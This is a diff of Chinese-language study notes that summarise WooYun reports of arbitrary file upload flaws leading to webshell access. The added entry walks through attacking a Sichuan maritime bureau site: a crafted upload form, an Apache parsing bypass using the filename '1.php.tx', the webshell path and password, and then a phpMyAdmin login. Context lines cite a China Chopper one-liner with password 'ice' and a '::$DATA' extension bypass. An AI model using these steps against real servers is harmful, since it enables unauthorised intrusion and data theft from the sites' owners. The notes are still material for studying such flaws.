@@ -49,7 +49,7 @@ test.php::$DATA //成功
   2. 上传图片处burp抓包该包，上传aspx文件getshell。  
   3. 菜刀一句话马地址,连接密码ice  
   
-###???不是很懂 MaticsoftSNS 1.9版本任意文件上传漏洞/中国人保寿险某分站任意文件上传导致getshell（影响路华救援多个分站/送sql注入）  
+###6.???不是很懂 MaticsoftSNS 1.9版本任意文件上传漏洞/中国人保寿险某分站任意文件上传导致getshell（影响路华救援多个分站/送sql注入）  
 链接：http://wooyun.org/bugs/wooyun-2010-0137397/http://wooyun.org/bugs/wooyun-2010-0192794  
 * 利用最简单的表单实现multipart/form-data方式上传脚本文件  
  如下的
@@ -63,3 +63,17 @@ test.php::$DATA //成功
 
 </form>
 ```
+  
+###7. 四川某市海事局存在任意文件上传漏洞getshell  
+链接：http://wooyun.org/bugs/wooyun-2010-0189600  
+* 构造表单,上传一句话：  
+<form action="http://**.**.**.**/webservice/upload/upload.php" form enctype="multipart/form-data" method="POST">  
+<input name="file" type="file">  
+<input name="" type="submit">  
+</form>  
+* 直接上传PHP文件会被拦截，所以需要结合apache的解析漏洞来绕过，上传文件的文件名为1.php.tx  
+* 根据返回的信息获取上传后的路径：http://**.**.**.**/attachment/616390554/1.php.tx  
+  密码为c
+* 找到数据连接信息  
+* 登录：http://**.**.**.**/phpmyadminall/
+* 接下来想看哪里就看哪里了
